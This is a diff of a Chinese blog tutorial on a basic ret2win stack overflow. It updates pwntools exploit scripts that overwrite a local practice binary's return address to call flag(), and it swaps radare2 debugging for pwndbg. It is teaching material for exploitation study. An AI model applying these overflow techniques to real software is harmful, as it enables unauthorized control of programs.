@@ -2,7 +2,7 @@
 title: ret2win
 subtitle: 最基本的二进制漏洞利用
 date: 2023-08-07T21:59:39+08:00
-draft: true
+draft: false
 author:
   name: CuB3y0nd
   link:
@@ -132,108 +132,110 @@ $ echo 'AAAA' | xxd
 ```python {title="exp.py"}
 from pwn import *
 
+context(os='linux', arch='amd64', log_level='debug')
+
 # 创建一个新进程
-p = process("./vuln")
-
-payload = 'A' * 52
-payload += '\x08\x04\x91\xc3'
-
-# 接收所有文字
-p.clean()
-
-p.sendline(payload)
-
-# 输出「Exploited!」字符串则说明我们成功了
-log.info(p.clean())
-```
-
-如果你直接运行上面的脚本，就会发现一个小问题：它不会工作。为什么？让我们用
-调试器来检查一下。我们将添加一个 `pause()`，以便我们有时间将 radare2 附加到
-此进程上。
-
-```python {title="exp.py"}
-from pwn import *
-
 p = process('./vuln')
 
 payload = 'A' * 52
 payload += '\x08\x04\x91\xc3'
 
-# 添加了这两行
-log.info(p.clean())
-pause()
-
+# 输出「Exploited!」字符串则说明我们成功了
 p.sendline(payload)
 
-log.info(p.clean())
+p.interactive()
 ```
 
-现在让我们使用 `python3 exp.py` 运行该脚本，然后打开一个新的终端，输入：
+如果你直接运行上面的脚本，就会发现一个小问题：它没有输出 `Exploited` 。为什么？
+我们可以用调试器来检查一下。添加 hook `pwndbg` 的代码，以及 `pause()`，以便
+我们可以在想发送 `payload` 的时候发送 `payload` 。
+
+```python {title="exp.py"}
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+context.terminal = ['alacritty', '-e']
+
+p = process('./vuln')
+
+# 下面这条指令可以在启动 pwndbg 后自动下断点
+# 为了调试程序的问题，我们在 `unsafe` 的 ret 指令返回时设断点
+gdb.attach(p, 'b *0x080491aa')
+
+payload = 'A' * 52
+payload += '\x08\x04\x91\xc3'
+
+pause()
+p.sendline(payload)
+
+p.interactive()
+```
+
+现在让我们使用 `python exp.py` 运行该脚本，它将自动打开一个 `pwndbg` 窗口：
+
+让我们在 `unsafe()` 返回时中断并读取返回地址的值：
 
 ```
-$ r2 -d -A $(pidof vuln)
-```
+$ disass unsafe
+$ c
 
-通过提供进程的 PID，radare2 可以 hook 它。让我们在 `unsafe()` 返回时中断并读取
-返回地址的值。
+<< press any button on the exploit terminal interface >>
 
-```
-[0xf7ef9fd0]> s main; pdf
-[0x080491ab]> s sym.unsafe; pdf
-[0x08049172]> db 0x080491aa
-[0x08049172]> dc
-
-<< press any button on the exploit terminal window >>
-
-INFO: hit breakpoint at: 0x80491aa
-[0x08049172]> pxw @ esp
-0xff9af3cc  0xc3910408 [...]
+$ bt
+#0  0x080491aa in unsafe ()
+#1  0xc3910408 in ?? ()
 [...]
 ```
 
-`0xc3910408`，看起来熟悉吗？这是我们试图发送的地址，只不过字节顺序被反转了，
+`0xc3910408` ，看起来熟悉吗？这是我们试图发送的地址，只不过字节顺序被反转了，
 而这种反转的原因是 [字节顺序](https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F) 使用大端序的系统将最高有效字节（具有最大值的字节）
 存储在最小的内存地址处，这就是我们发送它们的方式。使用小端序的系统的做法恰恰相反，
 这是有 [原因](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format) 的，并且我们遇到的大多数二进制文件都是小端序的。就我们而言，只要知道
-字节在使用小端序的可执行文件中 *以相反的顺序存储* 就可以了。
+字节在使用小端序的可执行文件中 *payload 以相反的顺序存储* 就可以了。
 
 ## 0x05 确定字节顺序
 
-`radare2` 附带了一个名为 `rabin2` 的工具，用于二进制分析：
+`pwntools` 附带了一个名为 `checksec` 的工具，用于二进制分析。我们可以直接在 `pwndbg`
+中使用这条指令：
 
 ```
-$ rabin2 -I ./vuln
+$ checksec
 [...]
-endian   little
+Arch:     i386-32-little
 [...]
 ```
 
-因此可以确定，我们的文件是小端序的。
+因此可以确定，我们的程序是 32-bit 小端序的。
 
 ## 0x06 反转字节顺序
 
-解决方法很简单：反转地址
+解决方法很简单：反转字节序
 
 ```python
 payload += '\x08\x04\x91\xc3'[::-1]
 ```
 
-如果你现在运行它，它将起作用：
+如果你现在运行它，它将成功输出 `Exploited!` ：
 
 ```
-$ python3 exp.py
-[+] Starting local process './vuln': pid 143985
-[*] Overflow me
-[*] Exploited!!!!!
-[*] Stopped process './vuln' (pid 143985)
+$ python exp.py
+[+] Starting local process './vuln' argv=[b'./vuln'] : pid 9645
+[DEBUG] Sent 0x39 bytes:
+[...]
+[*] Switching to interactive mode
+[DEBUG] Received 0x1b bytes:
+[...]
+Overflow me
+Exploited!!!!!
 ```
 
-你成功改变了程序的执行流程，调用了 `flag()` 函数！
+我们已经成功改变了程序的执行流程，调用了 `flag()` 函数！
 
 ## 0x07 Pwntools 和 字节顺序
 
-毫不奇怪，你并不是第一个想到「能否使字节顺序变得更简单」的人。
-幸运的是，pwntools 有一个内置的 `p32()` 函数可供使用！
+毫不奇怪，你并不是第一个想到「能否使字节顺序书写变得更简单」的人。
+幸运的是，`pwntools` 有一个内置的 `p32()` 函数可供使用！
 
 ```python
 payload += '\x08\x04\x91\xc3'[::-1]
@@ -263,17 +265,14 @@ TypeError: can only concatenate str (not "bytes") to str
 ```python {title="exp.py"}
 from pwn import *
 
-# 创建一个新进程
+context(os='linux', arch='amd64', log_level='debug')
+
 p = process('./vuln')
 
 payload = b'A' * 52
-# 使用 pwntools 打包
 payload += p32(0x080491c3)
 
-# 接收所有文字
-log.info(p.clean())
 p.sendline(payload)
 
-# 输出「Exploited!」字符串则说明我们成功了
-log.info(p.clean())
+p.interactive()
 ```
